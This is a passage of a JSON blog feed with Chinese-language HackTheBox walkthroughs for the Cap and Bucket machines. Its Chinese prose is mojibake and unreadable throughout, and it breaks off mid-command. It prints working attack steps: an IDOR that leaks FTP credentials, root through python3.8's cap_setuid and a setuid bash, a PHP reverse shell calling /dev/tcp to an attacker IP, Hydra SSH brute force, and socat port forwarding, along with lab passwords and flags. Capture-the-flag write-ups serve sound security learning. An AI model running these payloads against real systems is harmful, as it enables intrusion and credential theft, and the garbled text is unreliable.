            "content_html": "\n# Machine - Cap\n\n> https://app.hackthebox.com/machines/Cap | `Linux` | `Easy`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image.png)\n\nå¤§åé¼é¼çš„`Cap`ï¼Œæ–°æ‰‹å…³\n\n## Recon\n\n`nmap`ç«¯å£æ‰«æ\n\n```bash\nâœ  Cap nmap -sT -min-rate 5000 10.10.10.245    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST\nNmap scan report for 10.10.10.245\nHost is up (0.072s latency).\nNot shown: 701 closed tcp ports (conn-refused), 296 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.81 seconds\n```\n\n```bash\nâœ  Cap nmap -sT -A -p 21,22,80 10.10.10.245                        \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 12:24 CST\nNmap scan report for 10.10.10.245\nHost is up (0.12s latency).\n\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)\n|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)\n|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)\n80/tcp open  http    Gunicorn\n|_http-title: Security Dashboard\n|_http-server-header: gunicorn\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   110.57 ms 10.10.16.1\n2   55.69 ms  10.10.10.245\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.50 seconds\n```\n\næœ‰`FTP`æœåŠ¡çš„å­˜åœ¨ï¼Œæˆ‘ä»¬é¦–å…ˆæšä¸¾`FTP` ï¼Œä½†æ˜¯å¹¶ä¸æ”¯æŒåŒ¿åç”¨æˆ·è®¿é—®\n\n```bash\nâœ  Cap ftp 10.10.10.245\nConnected to 10.10.10.245.\n220 (vsFTPd 3.0.3)\nName (10.10.10.245:root): anonymous\n331 Please specify the password.\nPassword: \n530 Login incorrect.\nftp: Login failed\n```\n\nè®¿é—® `HTTP` ï¼Œä¸€ä¸ªåå°ç®¡ç†çš„æ¨¡æ¿\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image1.png)\n\næœ‰ä¸€äº›å¾ˆæœ‰è¶£çš„åŠŸèƒ½\n\nåœ¨ `/data/3` ä¸­èƒ½ä¸‹è½½ä¸€ä¸ª `pcap`æ–‡ä»¶\n\n`/ip` èƒ½çœ‹åˆ°`ip add` å‘½ä»¤æ‰§è¡Œçš„ç»“æœ\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image2.png)\n\n`/netstat` ä¸­èƒ½å‘ç°ç«¯å£å’Œè¿›ç¨‹ä¿¡æ¯\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image3.png)\n\nå‘ç°äº†ä¸€ä¸ªæœ‰è¶£çš„ç‚¹ `/data/x` æ˜¯ä¼šå¢åŠ çš„ï¼Œèƒ½è§‚å¯Ÿåˆ°æœ€å¤§æ˜¯åˆ°`9`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image4.png)\n\n## IDOR - ä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨\n\nä¸‹è½½çš„`pcap`æ–‡ä»¶è²Œä¼¼æ˜¯ä¸€æ®µæ—¶é—´å†…é€šè¿‡çš„æµé‡ï¼Œæˆ‘ä»¬ä¸€ç›´`ping` ï¼Œç­‰å¾…å®ƒæ›´æ–°ï¼Œæ›´æ–°åæˆ‘ä»¬å°†`pcap`æ–‡ä»¶ä¸‹è½½ä¸‹æ¥æ‰“å¼€ï¼Œèƒ½ç¡®å®šå°±æ˜¯å®ƒæ•è·çš„æµé‡\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image5.png)\n\nå¯ä»¥å°è¯•ä¸€ç›´ä¸‹è½½ `pcap` æ–‡ä»¶ï¼Œæ•æ‰ä¸‹è½½æ—¶çš„æµé‡\n\n```bash\nâœ  Cap for i in {0..9};do curl 10.10.10.245/download/${i} --output ${i}.pcap;sleep 1;done\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image6.png)\n\nå½“æˆ‘ä»¬åˆ†æåˆ°`0.pcap`æ–‡ä»¶çš„æ—¶å€™ï¼Œèƒ½å‘ç°æ•æ‰åˆ°äº†`FTP`çš„åŒ…ï¼Œè¿™åœ¨å…¶ä»–`>1.pacp`çš„æ•°æ®åŒ…ä¸­æ˜¯æ²¡æœ‰çš„\n\næ‰€ä»¥è¿™é‡Œå‡ºç°äº†åº”ç”¨é€»è¾‘ä¸Šçš„é”™è¯¯ï¼Œæ•æ„Ÿä¿¡æ¯æ³„éœ² (Sensitive Information Disclosure)ï¼Œä¸å®‰å…¨çš„ç›´æ¥å¯¹è±¡å¼•ç”¨ (Insecure Direct Object Reference - IDOR)\n\nå¹¶ä¸”åç«¯ä»£ç ä¸­å¯èƒ½æ˜¯ï¼š\n\n```bash\ndef download_file(i):\n    # å½“ i=0 æ—¶ï¼Œæœ‰ä¸€ä¸ªç‰¹æ®Šå¤„ç†ï¼Œå¯èƒ½ç”¨äºè°ƒè¯•æˆ–æµ‹è¯•\n    if i == 0:\n        file_path = \"/var/log/debug/ftp_capture.pcap\" # æŒ‡å‘äº†ä¸€ä¸ªå¼€å‘/è¿ç»´äººå‘˜ç•™ä¸‹çš„è°ƒè¯•æ–‡ä»¶\n    else:\n        # æ­£å¸¸é€»è¾‘\n        file_path = f\"/var/www/downloads/file_{i}.data\"\n    # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨å¹¶è¿”å›ç»™ç”¨æˆ·\n    if file_exists(file_path):\n        return send_file(file_path)\n    else:\n        return \"File not found\"\n```\n\nç„¶åæˆ‘ä»¬å¾—åˆ°äº†å®ƒ\n\nå¹¶ä¸”`FTP`æ•°æ®åŒ…ä¸­å¸¦æœ‰`nathan`ç”¨æˆ·çš„å‡­æ®ï¼Œ`nathan:Buck3tH4TF0RM3!`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image7.png)\n\nå‡­æ®å¯ä»¥è¿›å»åˆ° `FTP`\n\n```bash\nâœ  Cap ftp 10.10.10.245                                                                  \nConnected to 10.10.10.245.\n220 (vsFTPd 3.0.3)\nName (10.10.10.245:root): nathan\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> dir\n229 Entering Extended Passive Mode (|||24592|)\n150 Here comes the directory listing.\n-rw-rw-r--    1 1001     1001          408 Jun 11 04:18 index.html\ndrwxr-xr-x    3 1001     1001         4096 Jun 11 04:28 snap\n-r--------    1 1001     1001           33 Jun 10 19:39 user.txt\n226 Directory send OK.\n```\n\nä¹Ÿå¯ä»¥è¿›è¡Œ `SSH` ç™»å½•\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image8.png)\n\nå½“å‰å®¶ç›®å½•ä¸‹å¯ä»¥è¯»å–`user.txt`\n\n```bash\nnathan@cap:~$ cat user.txt \nc5a3b7e60be43d07acb3580714228ee7\n```\n\n## æƒé™æå‡\n\nè¿è¡Œ`Web`çš„`app.py` é‡Œé¢çš„ä¿¡æ¯å¾ˆæœ‰è¶£ï¼Œ`setuid(0)`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Cap/image9.png)\n\nä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°æ˜¯ä»¥`nathan`æƒé™è¿è¡Œçš„ï¼Œé‚£ä¹ˆ`setuid(0)` è¦æ€ä¹ˆæ‰èƒ½æœ‰æ•ˆå‘¢ï¼Ÿ\n\n```bash\nnathan@cap:/var/www/html$ ls -al\ntotal 32\ndrwxr-xr-x 6 nathan nathan 4096 Jun 11 09:47 .\ndrwxr-xr-x 3 root   root   4096 May 23  2021 ..\ndrwxr-xr-x 2 nathan nathan 4096 May 27  2021 __pycache__\n-rw-r--r-- 1 nathan nathan 4267 Jun 11 09:43 app.py\ndrwxr-xr-x 6 root   root   4096 May 23  2021 static\ndrwxr-xr-x 2 root   root   4096 May 23  2021 templates\ndrwxr-xr-x 2 root   root   4096 Jun 11 09:42 upload\n```\n\næˆ‘ä»¬ç›´æ¥è¿è¡Œ`python` ï¼Œç›´æ¥å°±èƒ½æ‹¿åˆ° `root` æƒé™äº†\n\n```bash\nnathan@cap:/var/www/html$ python3\npython3           python3-config    python3.8         python3.8-config  \nnathan@cap:/var/www/html$ python3.8\nPython 3.8.5 (default, Jan 27 2021, 15:41:15) \n[GCC 9.3.0] on linux\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import os;os.setuid(0)\n>>> os.system(id)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: expected str, bytes or os.PathLike object, not builtin_function_or_method\n>>> os.system('id')\nuid=0(root) gid=1001(nathan) groups=1001(nathan)\n0\n>>> os.system('chmod +s /bin/bash')\n0\n```\n\n```bash\nbash-5.0# cat root.txt \n6b21801e0d9e7354cfa2de802cf89dcd\n```\n\né€šè¿‡ `getcap` å‘½ä»¤ä¹Ÿèƒ½çŸ¥é“ä¸ºä»€ä¹ˆä¼šæœ‰è¯¥æƒé™\n\n```bash\nnathan@cap:/var/www/html$ which python3\n/usr/bin/python3\nnathan@cap:/var/www/html$ which python3.8\n/usr/bin/python3.8\nnathan@cap:/var/www/html$ getcap /usr/bin/python3\nnathan@cap:/var/www/html$ getcap /usr/bin/python3.8\n/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip\n```",
            "url": "https://www.sunsetaction.top/2025/06/11/HackTheBoxMachine - Cap",
            "title": "HackTheBox - Machine - Cap",
            "summary": "Machine Cap https://app.hackthebox.com/machines/Cap | Linux | Easy å¤§åé¼é¼çš„Capï¼Œæ–°æ‰‹å…³ Recon nmapç«¯å£æ‰«æ æœ‰FTPæœåŠ¡çš„å­˜åœ¨ï¼Œæˆ‘ä»¬é¦–å…ˆæšä¸¾FTP ï¼Œä½†æ˜¯å¹¶ä¸æ”¯æŒåŒ¿åç”¨æˆ·è®¿é—® è®¿é—® HTTP ï¼Œä¸€ä¸ªåå°ç®¡ç†çš„æ¨¡æ¿ æœ‰ä¸€...",
            "date_modified": "2025-06-11T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Linux",
                "Capabilities",
                "IDOR"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket",
            "content_html": "\n# Machine - Bucket\n\n> https://app.hackthebox.com/machines/Bucket | `Linux` | `Medium`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image.png)\n\n## Recon\n\nç«¯å£æ‰«æ\n\n```bash\nâœ  Bucket nmap -sT -min-rate 5000 10.10.10.212\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:27 CST\nNmap scan report for bucket.htb (10.10.10.212)\nHost is up (0.086s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.51 seconds\n```\n\n```bash\nâœ  Bucket nmap -sT -A -p 22,80 10.10.10.212                             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:28 CST\nNmap scan report for bucket.htb (10.10.10.212)\nHost is up (0.12s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   108.02 ms 10.10.16.1\n2   54.68 ms  bucket.htb (10.10.10.212)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.14 seconds\n```\n\nè®¿é—® `HTTP`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image1.png)\n\nä¸»é¡µä¸Šæ²¡æœ‰ä¸€ç‚¹ä¿¡æ¯ï¼Œå¯¹ç›®å½•è¿›è¡Œçˆ†ç ´\n\n```bash\nâœ  Bucket feroxbuster --url http://bucket.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,403 -x php,zip,txt \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher ğŸ¤“                 ver: 2.11.0\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http://bucket.htb/\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 403]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ true\n ğŸ’²  Extensions            â”‚ [php, zip, txt]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n[#>------------------] - 88s    46359/882180  23m     found:0       errors:37     \nğŸš¨ Caught ctrl+c ğŸš¨ saving scan state to ferox-http_bucket_htb_-1749173567.state ...\n[#>------------------] - 88s    46399/882180  23m     found:0       errors:37     \n[#>------------------] - 88s    46400/882180  527/s   http://bucket.htb/         \n```\n\nä½†æ˜¯æˆ‘æ³¨æ„åˆ°æºä»£ç ä¸­çš„å›¾ç‰‡æ˜¯é€šè¿‡å­åŸŸå`http://s3.bucket.htb` ä¸­è·å–çš„\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image2.png)\n\nå°†å…¶æ·»åŠ åˆ° `hosts`ï¼Œå¹¶è®¿é—®ï¼Œåªæ˜¾ç¤º `running`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image3.png)\n\nç½‘ä¸Šæœç´¢ `s3` å¤§éƒ¨åˆ†éƒ½æ˜¯ `AWS S3` ï¼Œæ‰€ä»¥å‡å®šè¿™æ˜¯ä¸€ä¸ª `AWS S3` å®ä¾‹\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image4.png)\n\nè·‘ä¸€ä¸‹ç›®å½•æ‰«æï¼Œèƒ½æ‰¾åˆ°ä¸¤ä¸ªå­ç›®å½•\n\n```bash\nâœBucket gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://s3.bucket.htb\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://s3.bucket.htb\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/health               (Status: 200) [Size: 54]\n/shell                (Status: 200) [Size: 0]\n/server-status        (Status: 403)\n```\n\n## AWS S3\n\n> å…³äºAWS S3 https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/Welcome.html\n> \n\næ ¹æ®æ‰‹å†Œï¼Œ`adserver`æ˜¯ä¸€ä¸ªå­˜å‚¨æ¡¶ï¼Œ`images/bug.jpg` æ˜¯å¯¹è±¡é”®ï¼Œ`http://s3.bucket.htb` æ˜¯ç«¯ç‚¹\n\nè®¿é—® `/shell` ä¼šè¢«é‡å®šå‘åˆ°ä¸€ä¸ªå¥‡æ€ªçš„`URL`ï¼Œçœ‹èµ·æ¥åªåƒæ˜¯åªæœ‰å†…ç½‘å¯ä»¥è®¿é—®\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image5.png)\n\nè®¿é—® `/health` å‘ç°é™¤äº† s3 è¿˜è¿è¡Œç€ `dynamodb`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image6.png)\n\n> å…³äº Dynamodb https://docs.amazonaws.cn/amazondynamodb/latest/developerguide/Introduction.html\n> \n\nä»æ–‡æ¡£ä¸Šçœ‹ï¼ŒDynamodb å’Œ S3 éƒ½å¯ä»¥ä½¿ç”¨ Amazon CLI æ¥è®¿é—®ï¼Œå¹¶ä¸”ä¸¤ä¸ªåº”ç”¨éƒ½æ˜¯å¯ä»¥é›†æˆçš„\n\n### Dynamodb\n\nè®¿é—®`Dynamodb`å‰ï¼Œè¦å…ˆé…ç½®  `aws-cli`\n\nPSï¼šå®˜æ–¹é…ç½®éœ€è¦ Access IDï¼Œå¹¶ä¸”æ³¨å†Œéœ€è¦ä¿¡ç”¨å¡ï¼Œä»¥ä¸ºå·®ç‚¹æ— äº†ï¼Œçœ‹äº†ä¸‹WPæ‰çŸ¥é“å¯ä»¥çå¡«\n\n```bash\nâœ  Bucket aws configure           \nAWS Access Key ID [None]: sunsetaction\nAWS Secret Access Key [None]: sunsetaction\nDefault region name [None]: CN\nDefault output format [None]: json\n```\n\nåˆ—å‡ºæ‰€æœ‰è¡¨\n\n```bash\nâœ  Bucket aws dynamodb list-tables --endpoint-url http://s3.bucket.htb\n{\n    \"TableNames\": [\n        \"users\"\n    ]\n}\n```\n\næŸ¥è¯¢è¡¨çš„æ•°æ®ï¼Œå¯ä»¥å¾—åˆ°å‡ ä¸ªç”¨æˆ·å‡­æ®\n\n```bash\nâœ  Bucket aws dynamodb scan --endpoint-url http://s3.bucket.htb --table-name users\n{\n    \"Items\": [\n        {\n            \"password\": {\n                \"S\": \"Management@#1@#\"\n            },\n            \"username\": {\n                \"S\": \"Mgmt\"\n            }\n        },\n        {\n            \"password\": {\n                \"S\": \"Welcome123!\"\n            },\n            \"username\": {\n                \"S\": \"Cloudadm\"\n            }\n        },\n        {\n            \"password\": {\n                \"S\": \"n2vM-<_K_Q:.Aa2\"\n            },\n            \"username\": {\n                \"S\": \"Sysadm\"\n            }\n        }\n    ],\n    \"Count\": 3,\n    \"ScannedCount\": 3,\n    \"ConsumedCapacity\": null\n}\n```\n\nå°†å…¶æ‹¿å»å¯¹`ssh`è¿›è¡Œç¢°æ’ï¼Œä½†æ˜¯æ— ç»“æœï¼Œè²Œä¼¼ä¹Ÿèƒ½å¯¹æ•°æ®è¿›è¡Œå†™å…¥ï¼Œä½†æ˜¯ç°åœ¨ä¹Ÿæ²¡ç”¨\n\n### æ–‡ä»¶ä¸Šä¼ \n\næˆ‘ä»¬é€šè¿‡æ–‡æ¡£ https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/list-buckets.html å¯ä»¥çŸ¥é“å­˜åœ¨ `aws s3 ls` å‘½ä»¤ï¼Œè¯¥å‘½ä»¤ä½œç”¨æ˜¯å°†åœ¨å•ä¸ªéåˆ†é¡µè°ƒç”¨ä¸­åˆ—å‡ºæ‚¨è´¦æˆ·ä¸­çš„æ‰€æœ‰é€šç”¨å­˜å‚¨æ¡¶ã€‚\n\n```bash\nâœ  Bucket aws --endpoint-url http://s3.bucket.htb s3 ls\n2025-06-06 15:06:03 adserver\n```\n\nå‘½ä»¤ç»“æœæ˜¯æˆ‘ä»¬å’Œ`images` åœ¨åŒä¸€ç›®å½•ä¸‹\n\næˆ‘ä»¬æŸ¥çœ‹å¸®åŠ©è¿˜èƒ½çœ‹åˆ° `cp` å‘½ä»¤ï¼Œé‚£ä¹ˆä»£è¡¨å¯èƒ½å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œä¸Šä¼ \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image7.png)\n\næˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æµ‹è¯•ä¸€ä¸‹\n\n```bash\nâœ  Bucket echo '<?php phpinfo();?>' > test.php                                                                                                                         \n\nâœ  Bucket aws --endpoint-url http://s3.bucket.htb s3 cp test.php s3://adserver/test.php\nupload: ./test.php to s3://adserver/test.php \n```\n\nå¯ä»¥ä¸Šä¼ ï¼Œä½†æ˜¯è²Œä¼¼æ— æ³•è§£æ\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image8.png)\n\nè¿™é‡Œçœ‹äº†ä¸‹`WP`ï¼Œä¹‹å‰è¿›è¡Œç›®å½•æ‰«æ`s3`çš„æ—¶å€™èƒ½æ‰«æåˆ°`/server-status` ï¼Œé‚£ä¹ˆè¯¥å¤„å’Œ`bucket.htb`å¯èƒ½åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè€Œä¸”å¯ä»¥æ”¯æŒè§£æ `php` æ‹“å±•å\n\nåœ¨ `adserver` ç›®å½•ä¸‹æ²¡æœ‰\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image9.png)\n\nè¿™é‡Œé€šè¿‡ `ls` å‘½ä»¤æ¥æŸ¥çœ‹ `adserver`æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨`index.html` ï¼Œé‚£ä¹ˆå¯èƒ½å°±æ˜¯ä¸»ç«™\n\n```bash\nâœ  Bucket aws --endpoint-url http://s3.bucket.htb s3 ls s3://adserver                    \n                           PRE images/\n2025-06-06 15:48:02       5344 index.html\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image10.png)\n\nè¿›è¡Œåå¼¹ `shell`\n\n```bash\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.69/1234 0>&1'\");?>\n```\n\nå’Œä¹‹å‰ä¸€æ ·çš„æ“ä½œå¯ä»¥ç›´æ¥è·å¾—å¼¹å›æ¥çš„ `shell`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image11.png)\n\n## æƒé™æå‡\n\n### å¯†ç ç¢°æ’\n\nå‘ç°å­˜åœ¨ç”¨æˆ·`roy`\n\n```bash\nwww-data@bucket:/var/www$ ls /home\nroy\n```\n\næˆ‘ä»¬ä½¿ç”¨çš„åˆ°çš„å¯†ç è¿›è¡Œç¢°æ’\n\n```bash\nâœ  Bucket hydra -l roy  -P passwords.txt -t 12 10.10.10.212 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-06 16:13:00\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task\n[DATA] attacking ssh://10.10.10.212:22/\n[22][ssh] host: 10.10.10.212   login: roy   password: n2vM-<_K_Q:.Aa2\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-06 16:13:06\n```\n\næˆåŠŸå¾—åˆ° `Roy`çš„`shell`\n\n```bash\nâœ  Bucket ssh roy@10.10.10.212   \nroy@10.10.10.212's password: \nWelcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri 06 Jun 2025 07:52:46 AM UTC\n\n  System load:                      0.05\n  Usage of /:                       33.9% of 17.59GB\n  Memory usage:                     30%\n  Swap usage:                       0%\n  Processes:                        256\n  Users logged in:                  2\n  IPv4 address for br-bee97070fb20: 172.18.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for ens160:          10.10.10.212\n  IPv6 address for ens160:          dead:beef::250:56ff:feb9:cb55\n\n229 updates can be installed immediately.\n103 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Fri Jun  6 06:08:21 2025 from 10.10.16.27\nroy@bucket:~$ \n```\n\nå½“å‰ç›®å½•ä¸‹èƒ½å¾—åˆ° `user.txt`\n\n```bash\nroy@bucket:~$ cat user.txt\n6e375b41aac41437da7b58d400a30c74\n```\n\n### ä¿¡æ¯æ”¶é›†\n\n`db.php`\n\n```bash\nroy@bucket:~/project$ cat db.php\n<?php\nrequire 'vendor/autoload.php';\ndate_default_timezone_set('America/New_York');\nuse Aws\\DynamoDb\\DynamoDbClient;\nuse Aws\\DynamoDb\\Exception\\DynamoDbException;\n\n$client = new Aws\\Sdk([\n    'profile' => 'default',\n    'region'  => 'us-east-1',\n    'version' => 'latest',\n    'endpoint' => 'http://localhost:4566'\n]);\n\n$dynamodb = $client->createDynamoDb();\n\n//todo\n```\n\nå†…éƒ¨å¼€æ”¾äº†å¥½å‡ ä¸ªç«¯å£\n\n```bash\nroy@bucket:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process\nudp                    UNCONN                  0                       0                                        127.0.0.53%lo:53                                             0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                         127.0.0.1:42189                                          0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                     127.0.0.53%lo:53                                             0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                         127.0.0.1:4566                                           0.0.0.0:*\ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*\ntcp                    LISTEN                  0                       511                                          127.0.0.1:8000                                           0.0.0.0:*\ntcp                    LISTEN                  0                       511                                                  *:80                                                   *:*\ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*\n```\n\næˆ‘ä»¬å°† `4566`å’Œ `8000`ç«¯å£è½¬å‘å‡ºå»\n\n```bash\nroy@bucket:~$ ./socat TCP-LISTEN:4567,fork tcp4:127.0.0.1:4566 &\n[1] 145731\nroy@bucket:~$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 &\n[2] 145736\n```\n\nå…¶ä¸­ `8000`ç«¯å£æ˜¯è²Œä¼¼æœªå®Œå·¥çš„\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image12.png)\n\n`4566`åƒæ˜¯`s3`çš„ç«¯ç‚¹\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image13.png)\n\nå°è¯•é€šè¿‡`aws`è®¿é—®\n\n```bash\nâœ  Bucket aws --endpoint-url http://bucket.htb:4567 s3 ls\n2025-06-06 16:04:01 adserver\n```\n\nå¯èƒ½æ˜¯ä¸€ä¸ªå†…éƒ¨ç«¯ç‚¹ï¼Œå°è¯•è¯»å–æ•°æ®åº“\n\n```bash\nâœ  Bucket aws dynamodb 